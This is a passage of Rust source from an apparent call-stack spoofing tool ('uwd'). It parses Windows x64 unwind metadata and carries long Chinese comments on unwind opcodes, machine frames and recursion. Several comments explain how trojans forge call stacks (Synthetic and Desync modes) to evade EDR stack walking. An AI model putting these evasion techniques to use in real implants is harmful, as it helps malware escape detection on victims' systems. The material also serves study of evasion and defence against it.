        // 链式退栈信息的递归解析和偶数对齐物理计算:如果一个函数的汇编代码非常大,或在编译优化时被拆分成多个不连续的代码块,单个UNWIND_INFO记录不下它的完整退栈动作.微软会将UNWIND_INFO的VersionFlags标志位置为UNW_FLAG_CHAININFO(0x40),并在当前UNWIND_CODE数组正下方,紧接着挂一个新的IMAGE_RUNTIME_FUNCTION结构体,指向父级(或下一段)退栈说明书
        if (flag & UNW_FLAG_CHAININFO) != 0 {
            let count = (*unwind_info).CountOfCodes as usize;
            // 如上个注释,IMAGE_RUNTIME_FUNCTION结构体在内存中4字节对齐,而UNWIND_CODE是2字节大小.且UNWIND_INFO的头部是4字节.如果CountOfCodes是偶数,那么也是4字节对齐的.如果CountOfCodes是奇数,就不能4字节对齐.因此微软会在这个奇数个UNWIND_CODE后再补上一个padding,凑成4字节对齐.
            // count & 1 判断是否为奇数
            let index = if count & 1 == 1 { count + 1 } else { count };
            let runtime = unwind_code.add(index) as *const IMAGE_RUNTIME_FUNCTION;
            // 函数递归调用Recursion,详见注释6
            if let Some(chained_stack) = ignoring_set_fpreg(module, &*runtime) {
                total_stack += chained_stack;
            } else {
                return None;
            }
        }

        Some(total_stack)
    }
}

// 注释1:为何最大参数设置为11
// 免杀/底层Hook中,需要调用的最复杂参数最多的api是NtCreateUserProcess(创建用户态进程)它的参数就是11个.纵观ntdll.dll所有Native Api没有任何一个常用Native Api的参数超过11.同时,避免无限扩展参数带来的Config结构体体积膨胀和汇编频繁拷贝的性能损耗
// 对应的汇编指令: 比较 cmp rdx ,11  跳转 jbe ..  mov eax,1(把错误码TooManyArguments(1)装入eax,且该寄存器会自动清零) ret(弹栈返回,退出当前函数)

// 注释2
// 关于小端序和大端序,多字节数据在物理内存中的存放顺序是相反的.大端序指高位字节放在低内存地址(符合人类阅读习惯),小端序指低位字节放在低内存地址(符合cpu硬件电路加法器的运算逻辑)
// opinfo=1时,代表函数分配的栈空间巨大,需要4字节32bits(up to 4GB-8).但一个UNWIND_CODE槽位只有2字节,微软因此借用了后续两个槽位(槽位2 槽位3)联合存储这个32位的数字.
// 常规笨方法先后读取后续两个槽位的FrameOffset字段,然后手动拼接为一个32位的数字
// 这里的黑魔法,先把unwind_code从指令槽位移到槽位2的起始位置.然后用as *mut i32将指针类型从2字节的*mut UNWIND_CODE转为4字节的*mut i32.这样将槽位2和槽位3共计4字节当作一个整体看待
// 为什么是*mut i32,毕竟内存地址并没有负数.这是由于微软遗留的传统.在微软c头文件和SEH规范中,所有内存偏移量在c中统一使用LONG类型(即 i32).但在物理层面*mut u32 和*mut i32是完全一样的,cpu执行的都是mov eax, dword ptr [内存地址].注意eax是32位的rax才是64位的

// 注释3
// 微软之所以把这两者分开,为了机制压缩PE文件.rdata节区的体积.因为绝大多数函数的栈空间都在几kb以内,如果全部用3个slots表示,会造成严重浪费
// UWOP_SAVE_NONVOL,占用2个slots(4字节),其FrameOffset是16位的,但需要乘以8进行缩放来表示真正的字节偏移.其物理表达区间为0--512kb-8 即0x0--0x7FFF8
// UWOP_SAVE_NONVOL_BIG,占用3个slots(6字节),除了instruction slot后续两个slots其FrameOffset用32位原生整数来表示,且不缩放.这两个slots分别代表一个32位数字的高16位和低16位(因为是小端序,槽位2表示低16位,槽位3表示高16位).其物理表达区间为0--4GB-8字节 即0x0--0xFFFFFFF8

// 注释4
// xmm寄存器是win64 cpu内部用于浮点运算和simd向量加速的128位(16字节)巨型寄存器.win64下xmm0-xmm5是易失性寄存器.xmm6-xmm15是非易失性寄存器.这种情况下
// 1. frameoffset的缩放因子从8变为16
// 2. 其对应的汇编指令movaps 如(movaps [rsp+0x20],xmm6),和push指令不同,是把数据写入此前已通过sub rsp,0x100分配好的现成栈槽中.因此没有增加栈深
// 3. 消耗2个slot,其中一个将UNWIND_CODE union表示为Anonymous字段,装WUOP_SAVE_XMM128指令和XMM的寄存器编号(6代表XMM6).另一个slot表示为FrameOffset字段,代表一个16位整数,乘以缩放因子16表达真实偏移
// XMM寄存器作用:
// 1. cpu内部专门用于浮点数运算,高速大块内存搬运,密码学加密解密等.传统win32下,cpu计算浮点数(如 3.3 *5.8)时,用的是x87浮点协处理器栈.在win64下,所有float单精度 和 double双精度 浮点数的算术(加减乘除)计算,必须放在XMM寄存器中完成
// 2. 急速内存拷贝:memcpy/RtlCopyMemory的物理引擎.由于普通寄存器如RAX一次指令最多搬运8字节.XMM寄存器一次最多搬运16字节.因此win内核和标准库的memcpy,底层大量使用xmm寄存器做16字节翻倍加速拷贝
// 3. SIMD向量并行计算(单指令处理多条数据).XMM是SIMD(single instruction , multiple data)的核心载体.因为其有16字节容量,cpu可以在一个时钟周期内,同时对4个32位整数执行加法,或同时对16个8位的字节执行替换
// 4. 硬件级AES密码学解密:现代cpu都有AES-NI(AES硬件加速指令集).AES加密算法的每个分组刚好是16字节,当在免杀马里解密shellcode或加密内存payload时,cpu的aesenc/aesdec硬件指令直接作用在XMM寄存器里,实现纳秒级解密

// 注释5
// 处理发生cpu硬件中断或异常时,os与cpu硬件自动压入物理堆栈的机器帧machine frame操作码(UWOP_PUSH_MACH_FRAM)
// 当cpu运行时发生硬件级异常(如 缺页中断#PF,除以0异常#DE,内存越界或断点调试#DB)时,win64 cpu的硬件电路会在进入异常处理例程前,自动,强行把当前cpu核心状态压入物理堆栈中,用于记录错误现场.cpu硬件自动压入的这块栈数据,物理上称为机器帧machine frame
// win64下的硬件规范中,机器帧压入的寄存器内容由op_info的数值(0或1)决定
// op_info=0时表示无错误码硬件异常(如除以0异常#DE 和 调试断点#BP/int 3).此时,cpu硬件自动压入5个状态寄存器(及必须的对齐):
// 1. ss 堆栈段寄存器,8字节
// 2. rsp 旧栈顶指针,8字节
// 3. RFLAGS cpu标志寄存器,8字节
// 4. CS 代码段寄存器,8字节
// 5. rip 发生异常时的指令指针,8字节
// 以上共计40字节,但物理栈上是16字节对齐,加上对齐就是48字节,但是微软固定在后面加上24字节的padding成了64字节.即这里机器帧的大小为0x40字节(64字节)
// 机器帧本身并没有影子空间,那么保存状态之后的__except异常处理函数怎么被安全调用?该异常处理函数的影子空间在什么地方?
// 异常处理函数并不是由cpu直接调用的,而是由ntdll!KiUserExceptionDispatcher在后续汇编中主动开辟影子空间调用的.其流程如下:
// 1. cpu硬件层(压入机器帧).当opinfo=0代表的硬件异常发生时,cpu硬件在栈上压入64字节的机器帧.
// 2. 内核捕获异常后,在用户态栈上构建EXCEPTION_RECORD 和 CONTEXT结构体,把控制权强行交给用户态入口函数ntdll!KiUserExceptionDispatcher
// 3. 开始执行ntdll!KiUserExceptionDispatcher时,会先执行prologue sub rsp,0x4F0 这个空间为 RtlDispatchException 准备了参数;且为后续的异常处理函数（Handler）开辟好了标准的 32字节影子空间
// 4. 有了KiUserExceptionDispatcher 刚刚在栈上分配的影子空间,分发器才会安全执行call,调用__except函数或handler
// 当opinfo=1的情况下,cpu的硬件中断为带ErrorCode的cpu异常,硬件在栈上多压入了一个8字节的ErrorCode.如内存缺页异常#PF(page fault 一般发生在读写野指针中),通用保护异常#GP(对齐错误或指令非法),堆栈故障(#SS).此时机器帧大小变为0x48(72字节),即除了前文的5个寄存器 + ErrorCode(8字节) + 3个8字节的固定填充
// 异常分发器（KiUserExceptionDispatcher）如何利用这个 ErrorCode
// 1. 分发器从 RSP + 0x18 处读出这 8 字节的 ErrorCode
// 2. 位 0（P 位）如果为 0 → 代表访问了未映射的无效内存（如 NULL 指针）;位 1（W/R 位）如果为 1 → 代表是执行“写入”操作时引发的崩溃
// 3. 分发器把这个 ErrorCode 提取并填入 EXCEPTION_RECORD 中，传给你的 __except过滤函数，方便调试器（Windbg）打印出 Access violation writing location 0x00000000

// 注释6
// 关于递归函数,常见的困惑在于函数自身的定义还没有完成,怎么在其定义中调用自己? 函数的编译和运行要分开看待
// 编译器:函数定义时并不会立即执行.rustc扫描代码时,发现递归的情况.会在再次出现函数调用的地方做标记:代表之后运行到这里时,在这里跳转到该函数的开头去执行.
// 运行期:程序跑起来的时候,函数已经完整的存在于内存.在内存中,每一次调用自己都不是在原来的空间.而是cpu重新复制一份全新的局部变量和内存空间(即 栈帧)
// 回到具体代码中 当cpu运行到 if let Some(chained_stack) = ignoring_set_fpreg(
// 1. 暂停当前帧(挂起),当前的当前的 ignoring_set_fpreg停止运行,把他现在的状态包括total_stack保存在内存栈中
// 2. 生成新帧(克隆),cpu用父节点 &*runtime 的地址,重新从ignoring_set_fpreg 的第一行代码开始运行.这次,所有的局部变量都是全新的.
// 3. 触底返回(终止),父节点的函数运行完成,算出父节点占用的栈空间.执行到Some(total_stack) 并返回
// 4. 唤醒继续（归并）,之前挂起的函数被唤醒.
// 递归函数的要求:
// 1. 入口:每次调用自己时,传入的参数必须是更小的子问题
// 2. 出口:必须有一个条件不再调用自己,直接返回结果.如 这里的Some(total_stack)
// 3. 归并:即拿到结果后继续处理.拿到子调用的返回值后,结合当前变量做出最后计算.

// 注释7
// 使用了帧指针rbp的函数栈帧的prologue操作:win64汇编中,绝大多数函数只靠rsp移动来管理内存,但某些复杂函数(如 包含动态大小的数组,复杂局部变量的函数),单靠rsp容易乱.于是编译器会在prologue中建立固定的基准锚点.PE文件的.pdata展开元数据中,UWOP_SET_FPREG操作码就是专门记录"该函数把RBP置为帧指针"的标记
// 在此之前排除了 (flag & UNW_FLAG_EHANDLER) != 0 && (flag & UNW_FLAG_CHAININFO) != 0 这两个表示该函数有SEH异常处理块和该函数有链式展开解构(拆分成多个UNWIND_INFO节点的情况)
// 因为如果一个函数既有异常处理,又有链式展开,还建立了RBP帧指针.那么它的栈内存布局在运行时是高度动态且及其复杂的,也是不能被可靠的伪造的.因此要放弃
// 此外,(*unwind_info).FrameInfo.FrameRegister() != Registers::Rbp as u8 排除使用除rbp外的其他寄存器作为栈帧指针的情况.理论上win64允许使用任何non-volatile作为帧指针.但传统rbp作为帧指针才是标准布局
// ((*unwind_info).FrameInfo.FrameOffset() as i32) << 4 在UNWIND_INFO结构体头部,记录FrameOffset的空间只有4bit(只能表示0-15).为了用4bit表示更大偏移,win约定对齐使用16倍的缩放因子.即实际偏移量为FrameOffset*16 那么在二进制中乘以16等价于左移4位(<<4)

// 注释8
// 条件编译属性（Conditional Compilation Attribute）与cargo.toml中定义的可选项features配合使用.在编译时cargo build --features desync → #[cfg(feature = "desync")]下的代码会被编译
// 在uwd项目中, 该属性用于切换不同技术路线的调用栈伪造.
// #[cfg(feature = "desync")]:开启desync特性时,引入Desync去同步栈伪造的汇编入口spoof.对应的原理如下
// edr检测木马的核心手段之一是栈回溯call stack walking.当木马调用敏感API(如 virtualalloc或系统调用syscall).edr的hook或内核etw-ti会顺着当前线程的rsp栈指针向上追溯(通过RtlVirtualUnwind)
// 正常程序:栈上每一层返回地址都指向磁盘上合法的dll(如 kernel32.dll -> ntdll.dll)
// 未经伪造的木马:栈上会出现"指向没有磁盘文件对应的内存区域"的返回地址.edr会报毒拦截
// Synthetic模式是原栈绘制假帧:不改变当前栈空间本身,而是通过计算,直接在当前线程栈上绘制一套假调用链.
//  1. 扫描合法PE模块(kernelbase.dll、kernel32.dll 和 ntdll.dll 的.pdata节区)
//  2. 找到基准锚点:找到系统标准线程启动函数(RtlUserThreadStart 和 BaseThreadInitThunk)的展开元数据unwind info 并计算它们占用的栈空间大小
//  3. 构造假栈帧:发起敏感调用前,手动向当前栈写入假的返回地址(指向真正的系统dll函数内部指令),假的rbp寄存器值和假参数
//  4. 利用gadget接管跳转:借助系统dll中特定汇编指令(如 add rsp,0x58; ret 或 jmp rbx)完成跳板跳转
//  5. 恢复现场:调用完成,通过跳板清理写入的假帧,恢复原来的rsp和rip
// 以上, 整个链条上所有的地址都有合法的磁盘dll背书,用于骗过edr的同步回溯
// Desync模式:synthetic模式虽然拼出来了假帧,但真实的shellcode内存依然和这个栈绑定在一起.如果edr采用一部快照/硬件断点/内核级etw-ti异步扫栈,依然有可能捕获到异常.而desync在发起敏感调用时,将执行shellcode的真实栈,与系统api运行的栈彻底解耦
// 1. 开辟/借用干净栈:准备一个完全独立,洁净的临时栈空间,或借用系统线程池/fiber的栈
// 2. 保存cpu上下文:保存当前shellcode执行的所有通用寄存器
// 3. 物理切换rsp指针:在汇编级别(spoof.asm)把cpu的rsp寄存器修改为指向那个干净的临时栈
// 4. 绑定基础返回地址:将临时栈的底层返回地址锚定在BaseThreadInitThunk或RtlUserThreadStart的起始处
// 5. 异步防护能力:在敏感api执行整个周期中,无论cpu寄存器还是当前被检视的栈空间,与木马shellcode堆内存彻底断了指针联系.即使edr在内核态做异步快照,也只能捕获到一个及其干净的普通系统线程状态.

// 注释9
// 虽然物理上开辟的栈字节数永远是整数.这里as i32是为了防止Rust乘法溢出,以及兼容c的sdk类型惯例
// FrameOffset在结构体中类型是16位的u16(最大值为65535).如果不用i32,直接用u16 * 8(最极端情况是 65535 * 8)得到的数字远大于u16表达的数值上限,在debug下会引发溢出崩溃.因为此处frame_offset的类型是rust根据=号后面的数据类型推断出来的.因此必须将数据类型提升
// 那为啥是i32.在微软官方头文件winnt.h(c/c++)中,偏移量(displacement/offset)在c中习惯性定义为LONG(对应rust的i32)

// 注释10
// Rust强制规定,所有赋值操作(包括 =, +=, -=, *= 等)返回值统一为unit空类型(),该类型在rust类型中占用0字节,纯粹的表达赋值动作已完成.而在c/c++中,赋值表达式的返回值是修改后的数值本身.即i+=3的返回值是修改后的数值本身.这在c/c++语境下,对于int x=0; if(x=5).这里本身是为了判断x==5,漏写了一个= 造成再次对x赋值为5,那么if()中的判断永远为真,这是极难发现的错误.
// 为了风格统一,建议在此处加上;

// 注释11
// 对于比较的双方 Register(enum) 和 op_info(usize) .原本是不同的类型.但在Register的定义中指定了 #[repr(u8)],将其每个枚举值都映射为一个8位无符号整数(u8),且Register内部的字段是按照专门的顺序排列的,和win64规范中,寄存器的编号相对应.
// 此外,还对Register实现了PartialEq trait用于比较
// 那么根据Register的定义可知,其内部字段会被顺序赋值,而op_info是一个usize.它们之间为啥不能比较呢?
// 这个问题是rust和c/c++之间最本质的区别.Rust是一个强类型系统,Register的字段确实在物理内存上被赋予了数字,但Rust不允许不同类型之间直接进行隐式比较.
// 1. 物理内存值 ≠ 语言层面的类型:记住物理层面,Registers::Rsp 在内存里装的二进制确实就是 4.但其类型依然是enum Registers，而不是 usize.在c/c++中确实可以隐式转换并比较,但在rust中一定不行
// 2. 对enum Register派生 #[derive(PartialEq)]也不行.因为派生 #[derive(PartialEq)] 只能实现同类型比较(即 Registers == Registers，例如 Registers::Rsp == Registers::Rbp）)

// 题外话 win64下,虽然cpu寄存器支持高达128TB的虚拟内存,但微软在PE文件结构体内部,依然强行规定所有RVA都是u32.
// 即IMAGE_SECTION_HEADER中的PointerToRawData（文件偏移）和 VirtualAddress（内存 RVA）都是 u32; IMAGE_OPTIONAL_HEADER64中的SizeOfImage: u32,该字段表示(整个EXE加载到内存后的总尺寸)
// 以上,单个exe/dll文件体积物理上不超过4GB,否则PointerToRawData 就会溢出，无法寻址到 4 GB 以外的文件内容;单个模块展开后的内存镜像（SizeOfImage）物理上绝对不能超过4 GB

